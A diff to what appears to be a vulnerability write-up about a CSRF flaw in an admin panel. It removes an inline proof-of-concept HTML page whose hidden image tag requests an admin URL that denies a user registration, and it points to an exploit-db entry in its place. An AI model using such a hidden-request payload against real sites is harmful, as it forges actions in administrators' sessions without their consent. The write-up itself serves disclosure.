@@ -56,14 +56,7 @@ We can see what's going on by viewing the source.
 
 As we can see, the page create a request by trying to fetch an image, and executes the request in the background.
 
-PoC.html:
-```
-<html>
-	<body>
-		<img style="display:none" src="http://localhost/admin/?do=regstatus&action=deny&id=2" alt="">
-	</body>
-</html>
-```
+You can view the PoC on: https://www.exploit-db.com/exploits/46027
 
 Here it is in action:
 
